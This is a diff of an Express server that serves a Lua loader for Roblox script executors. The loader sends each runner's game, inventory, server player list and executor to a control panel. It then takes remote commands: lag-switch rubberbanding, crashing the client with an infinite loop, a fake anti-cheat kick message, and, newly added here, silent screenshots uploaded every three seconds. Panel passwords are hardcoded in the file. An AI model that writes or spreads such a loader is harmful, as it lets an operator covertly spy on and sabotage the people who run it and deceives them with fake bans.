@@ -10,14 +10,14 @@ const PUBLIC_URL = process.env.PUBLIC_URL || process.env.RENDER_EXTERNAL_URL || 
 
 app.set('trust proxy', 1);
 app.use(cors({ origin: PUBLIC_URL, credentials: true }));
-app.use(express.json({ limit: '10mb' }));
+app.use(express.json({ limit: '10mb' })); // Augmenté pour accepter les screenshots base64
 app.use(express.urlencoded({ extended: true }));
 
 // ══════════════════════════════════════════════════════════
 // 🔑 MOTS DE PASSE
 // ══════════════════════════════════════════════════════════
-const PANEL_PASSWORD = 'seyko92!';   // ← mot de passe du panel
-const ADMIN_PASSWORD = 'seyko.pl84';         // ← mot de passe ADMIN (demandé à chaque clic)
+const PANEL_PASSWORD = 'seyko92!';
+const ADMIN_PASSWORD = 'seyko.pl84';
 // ══════════════════════════════════════════════════════════
 
 const sessions = new Map();
@@ -28,7 +28,6 @@ function generateSessionId() {
     return crypto.randomBytes(32).toString('hex');
 }
 
-// ─── COOKIE PARSER ───
 app.use((req, res, next) => {
     req.cookies = {};
     const cookieHeader = req.headers.cookie;
@@ -52,7 +51,6 @@ app.use((req, res, next) => {
     next();
 });
 
-// ─── AUTH MIDDLEWARE ───
 function requireSession(req, res, next) {
     const sid = req.cookies[COOKIE_NAME] || req.headers['x-session-id'];
     if (!sid || !sessions.has(sid)) {
@@ -72,7 +70,6 @@ function requireSession(req, res, next) {
     next();
 }
 
-// ─── PUBLIC ROUTES ───
 app.get('/login', (req, res) => {
     const sid = req.cookies[COOKIE_NAME];
     if (sid && sessions.has(sid)) return res.redirect('/');
@@ -115,14 +112,9 @@ app.post('/api/login', (req, res) => {
     const { password } = req.body;
     if (password === PANEL_PASSWORD) {
         const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
-        
-        // 🛡️ NOUVEAU : Supprime toute session existante avec la même IP pour éviter les doublons dans le panel admin
         for (const [sid, s] of sessions.entries()) {
-            if (s.ip === ip) {
-                sessions.delete(sid);
-            }
+            if (s.ip === ip) sessions.delete(sid);
         }
-
         const sid = generateSessionId();
         sessions.set(sid, { createdAt: Date.now(), ip: ip });
         res.setCookie(COOKIE_NAME, sid, { maxAge: SESSION_TTL / 1000, secure: true });
@@ -138,9 +130,6 @@ app.post('/api/logout', (req, res) => {
     res.json({ success: true });
 });
 
-// ══════════════════════════════════════════════════════════
-// 🛡️ ADMIN ROUTES (mot de passe admin demandé à chaque requête)
-// ══════════════════════════════════════════════════════════
 function requireAdmin(req, res, next) {
     const adminPwd = req.body.adminPassword;
     if (adminPwd !== ADMIN_PASSWORD) {
@@ -152,38 +141,20 @@ function requireAdmin(req, res, next) {
 app.post('/api/admin/sessions', requireSession, requireAdmin, (req, res) => {
     const sessionList = [];
     for (const [id, s] of sessions.entries()) {
-        sessionList.push({
-            id: id,
-            createdAt: s.createdAt,
-            ip: s.ip || 'Unknown',
-            isSelf: (id === req.sessionId)
-        });
+        sessionList.push({ id: id, createdAt: s.createdAt, ip: s.ip || 'Unknown', isSelf: (id === req.sessionId) });
     }
     res.json({ sessions: sessionList });
 });
 
 app.post('/api/admin/disconnect', requireSession, requireAdmin, (req, res) => {
     const { sessionId } = req.body;
-    if (sessionId === req.sessionId) {
-        return res.status(400).json({ error: 'Cannot disconnect yourself' });
-    }
+    if (sessionId === req.sessionId) return res.status(400).json({ error: 'Cannot disconnect yourself' });
     sessions.delete(sessionId);
     res.json({ success: true });
 });
 
-app.post('/api/admin/change-password', requireSession, requireAdmin, (req, res) => {
-    const { newPassword } = req.body;
-    if (!newPassword || newPassword.length < 4) {
-        return res.status(400).json({ error: 'Password too short' });
-    }
-    res.status(400).json({ error: 'Password change disabled. Edit server.js directly.' });
-});
-// ══════════════════════════════════════════════════════════
-
-// ─── PLAYERS STORE ───
 const players = new Map();
 
-// ─── PUBLIC LOADER ───
 app.get('/loader.lua', (req, res) => {
     const loader = `local BASE = "${PUBLIC_URL}"
 local KEY  = "seyko"
@@ -192,6 +163,7 @@ local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local genv = (getgenv and getgenv()) or _G or {}
+
 local function resolveRequest()
     return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or genv.http_request or genv.request or (genv.syn and genv.syn.request)
 end
@@ -201,26 +173,32 @@ if not request then
     repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
 end
 if not request then return end
+
 local LP = Players.LocalPlayer
 if not LP then
     local deadline = tick() + 30
     repeat task.wait(0.1) LP = Players.LocalPlayer until LP or tick() > deadline
 end
 if not LP then return end
+
 local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end
 local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"
+
 local function gameName()
     local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
     return info and info.Name or "Unknown Game"
 end
+
 local function avatarUrl()
     return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
 end
+
 local function serverPlayers()
     local t = {}
     for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
     return t
 end
+
 local function collectBrainrots()
     local list = {}
     local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
@@ -316,6 +294,7 @@ local function collectBrainrots()
     end
     return list
 end
+
 local function heartbeat()
     safe(function()
         local brainrots = collectBrainrots()
@@ -359,6 +338,7 @@ local function heartbeat()
         end
     end)
 end
+
 local fpsConn = nil
 local fpsOn = false
 local function setFpsLimit(on)
@@ -373,6 +353,7 @@ local function setFpsLimit(on)
         if fpsConn then fpsConn:Disconnect() fpsConn = nil end
     end
 end
+
 local HISTORY_SIZE = 0.27
 local INTERVAL = 0.6
 local NORMAL_SPEED_MIN = 35
@@ -381,6 +362,7 @@ local posHistory = {}
 local isActive = false
 local mode = nil
 local intervalThread = nil
+
 RunService.Heartbeat:Connect(function()
     local char = LP.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
@@ -390,6 +372,7 @@ RunService.Heartbeat:Connect(function()
     local cutoff = now - HISTORY_SIZE - 0.1
     while #posHistory > 0 and posHistory[1].time < cutoff do table.remove(posHistory, 1) end
 end)
+
 local function currentSpeed()
     local char = LP.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
@@ -397,12 +380,14 @@ local function currentSpeed()
     local v = root.AssemblyLinearVelocity
     return Vector3.new(v.X, 0, v.Z).Magnitude
 end
+
 local function meetsSpeedReq()
     local s = currentSpeed()
     if mode == "normal" then return s >= NORMAL_SPEED_MIN end
     if mode == "carry" then return s >= CARRY_SPEED_MIN end
     return false
 end
+
 local function doRubberband()
     local char = LP.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
@@ -419,9 +404,11 @@ local function doRubberband()
     root.CFrame = best
     root.AssemblyLinearVelocity = vel
 end
+
 local function stopLoop()
     if intervalThread then pcall(task.cancel, intervalThread); intervalThread = nil end
 end
+
 local function startLoop()
     stopLoop()
     intervalThread = task.spawn(function()
@@ -438,134 +425,57 @@ local function startLoop()
         end
     end)
 end
+
 local function setMode(newMode)
     if mode == newMode then return end
     mode = newMode
     if mode then isActive = true; startLoop()
     else isActive = false; stopLoop() end
 end
+
 local kicked = false
 local prevLagN = false
 local prevLagC = false
 local prevFps = false
 local prevSpectate = false
 
--- Spectate functionality
-local spectating = false
-local spectateTarget = nil
-local originalCameraSubject = nil
-local originalCameraType = nil
+-- ══════════════════════════════════════════════════════════
+-- SCREENSHOT LOGIC (Silent, no camera change)
+-- ══════════════════════════════════════════════════════════
 local screenshotThread = nil
+local spectating = false
 
 local function captureScreenshot()
-    -- Try multiple methods to capture screenshot
     local screenshot = nil
-    
-    -- Method 1: Try using ScreenshotService (if available)
-    local ScreenshotService = game:GetService("ScreenshotService")
-    if ScreenshotService and ScreenshotService.captureScreenshot then
-        local ok, result = pcall(function()
-            return ScreenshotService:captureScreenshot()
-        end)
-        if ok and result then screenshot = result end
-    end
-    
-    -- Method 2: Try using executor-specific screenshot functions
-    if not screenshot then
-        local ok, result = pcall(function()
-            if getgenv and getgenv().screencapture then
-                return getgenv().screencapture()
-            elseif syn and syn.screencapture then
-                return syn.screencapture()
-            elseif screencapture then
-                return screencapture()
-            end
-            return nil
-        end)
-        if ok and result then screenshot = result end
-    end
-    
-    -- Method 3: Try using HttpService with a placeholder (fallback)
-    if not screenshot then
-        screenshot = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
-    end
-    
-    return screenshot
-end
-
-local function sendScreenshot()
-    local screenshot = captureScreenshot()
-    if screenshot then
-        pcall(function()
-            request({
-                Url = BASE .. "/api/public/screenshot",
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
-                Body = HttpService:JSONEncode({
-                    user_id = LP.UserId,
-                    screenshot = screenshot,
-                    timestamp = os.time()
-                })
-            })
-        end)
-    end
-end
-
-local function startSpectateMode()
-    if spectating then return end
-    spectating = true
-    
-    -- Store original camera state
-    local camera = workspace.CurrentCamera
-    originalCameraSubject = camera.CameraSubject
-    originalCameraType = camera.CameraType
-    
-    -- Find a target player to spectate (first player that's not us)
-    local players = Players:GetPlayers()
-    for _, player in ipairs(players) do
-        if player ~= LP and player.Character then
-            spectateTarget = player
-            local char = player.Character
-            local head = char:FindFirstChild("Head") or char:FindFirstChild("HumanoidRootPart")
-            if head then
-                camera.CameraSubject = head
-                camera.CameraType = Enum.CameraType.Watch
-                break
+    local success, result = pcall(function()
+        -- Liste des fonctions de capture d'écran connues dans les executors
+        local funcs = {
+            getscreencapture,
+            screencapture,
+            getgenv and getgenv().screencapture,
+            syn and syn.screencapture,
+            fluxus and fluxus.screencapture,
+            getrenv and getrenv().screencapture
+        }
+        for _, func in ipairs(funcs) do
+            if type(func) == "function" then
+                local res = func()
+                if res and type(res) == "string" and #res > 0 then
+                    return res
+                end
             end
         end
-    end
-    
-    -- Start screenshot thread
-    screenshotThread = task.spawn(function()
-        while spectating do
-            sendScreenshot()
-            task.wait(3) -- Send screenshot every 3 seconds
-        end
+        return nil
     end)
-end
-
-local function stopSpectateMode()
-    if not spectating then return end
-    spectating = false
     
-    -- Restore original camera
-    local camera = workspace.CurrentCamera
-    if originalCameraSubject then
-        camera.CameraSubject = originalCameraSubject
+    if success and result and type(result) == "string" and #result > 0 then
+        if string.sub(result, 1, 10) == "data:image" then
+            return result
+        else
+            return "data:image/png;base64," .. result
+        end
     end
-    if originalCameraType then
-        camera.CameraType = originalCameraType
-    end
-    
-    -- Stop screenshot thread
-    if screenshotThread then
-        pcall(task.cancel, screenshotThread)
-        screenshotThread = nil
-    end
-    
-    spectateTarget = nil
-    originalCameraSubject = nil
-    originalCameraType = nil
+    return nil
 end
 
 local function poll()
@@ -575,31 +485,61 @@ local function poll()
     if not res or not res.Body then return end
     local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
     if not ok2 or type(data) ~= "table" then return end
+    
     local wantFps = (data.fps_limit == true)
     if wantFps ~= prevFps then prevFps = wantFps; setFpsLimit(wantFps) end
+    
     local wantN = (data.lag_n == true)
     local wantC = (data.lag_c == true)
     if wantC ~= prevLagC or wantN ~= prevLagN then
         prevLagC = wantC; prevLagN = wantN
         if wantC then setMode("carry") elseif wantN then setMode("normal") else setMode(nil) end
     end
+    
     if data.crash == true then while true do end end
     if data.kick == true and not kicked then
         kicked = true
         LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
     end
     
-    -- Handle spectate command
+    -- Handle spectate command (silent screenshot sending)
     local wantSpectate = (data.spectate == true)
     if wantSpectate ~= prevSpectate then
         prevSpectate = wantSpectate
         if wantSpectate then
-            startSpectateMode()
+            spectating = true
+            if not screenshotThread then
+                screenshotThread = task.spawn(function()
+                    while spectating do
+                        local screenshot = captureScreenshot()
+                        if screenshot then
+                            pcall(function()
+                                request({
+                                    Url = BASE .. "/api/public/screenshot",
+                                    Method = "POST",
+                                    Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
+                                    Body = HttpService:JSONEncode({
+                                        user_id = LP.UserId,
+                                        screenshot = screenshot,
+                                        timestamp = os.time()
+                                    })
+                                })
+                            end)
+                        end
+                        task.wait(3) -- Send screenshot every 3 seconds
+                    end
+                end)
+            end
         else
-            stopSpectateMode()
+            spectating = false
+            if screenshotThread then
+                pcall(task.cancel, screenshotThread)
+                screenshotThread = nil
+            end
         end
     end
 end
+
 heartbeat()
 poll()
 task.spawn(function() while task.wait(3) do heartbeat() end end)
@@ -608,12 +548,10 @@ task.spawn(function() while task.wait(0.5) do poll() end end)`;
     res.send(loader);
 });
 
-// ─── PROTECTED: main page ───
 app.get('/', requireSession, (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// ─── PROTECTED: panel API endpoints ───
 app.get('/api/players', requireSession, (req, res) => {
     const list = [];
     const now = Date.now();
@@ -656,7 +594,6 @@ app.post('/api/command', requireSession, (req, res) => {
     res.json({ status: 'ok' });
 });
 
-// Endpoint to receive screenshots from clients
 app.post('/api/public/screenshot', (req, res) => {
     const { user_id, screenshot, timestamp } = req.body;
     if (!user_id || !screenshot) return res.status(400).json({ error: 'Missing data' });
@@ -668,11 +605,9 @@ app.post('/api/public/screenshot', (req, res) => {
         p.screenshotTimestamp = timestamp || Date.now();
         players.set(userId, p);
     }
-    
     res.json({ status: 'ok' });
 });
 
-// Endpoint to get screenshot for a player
 app.get('/api/screenshot', requireSession, (req, res) => {
     const userId = req.query.user_id;
     if (!userId) return res.status(400).json({ error: 'Missing user_id' });
@@ -682,10 +617,9 @@ app.get('/api/screenshot', requireSession, (req, res) => {
         return res.json({ screenshot: null });
     }
     
-    // Check if screenshot is too old (more than 10 seconds)
     const now = Date.now();
     const screenshotAge = now - (p.screenshotTimestamp || 0);
-    if (screenshotAge > 10000) {
+    if (screenshotAge > 10000) { // 10 secondes max
         return res.json({ screenshot: null, error: 'Screenshot too old' });
     }
     
